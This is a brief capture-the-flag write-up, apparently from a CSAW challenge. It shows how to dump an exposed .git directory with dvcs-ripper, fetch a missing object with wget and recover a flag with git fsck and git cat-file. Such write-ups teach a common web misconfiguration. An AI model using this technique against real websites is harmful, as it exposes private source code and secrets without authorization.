We first use dvcs-ripper like last time. Then:

```
$ git fsck
Checking object directories: 100% (256/256), done.
missing blob c0df768c5c47c00987cd860ae75ae0ec0c5fd1af

$ wget http://ownforall.hsf.csaw.io/.git/objects/c0/df768c5c47c00987cd860ae75ae0ec0c5fd1af

put it back
$ mkdir .git/objects/c0
$ mv df768c5c47c00987cd860ae75ae0ec0c5fd1af .git/objects/c0

$ git fsck
Checking object directories: 100% (256/256), done.
dangling blob c0df768c5c47c00987cd860ae75ae0ec0c5fd1af

$ git cat-file -p c0df768c5c47c00987cd860ae75ae0ec0c5fd1af
flag{so_we_may_have_messed_up_git1}
```
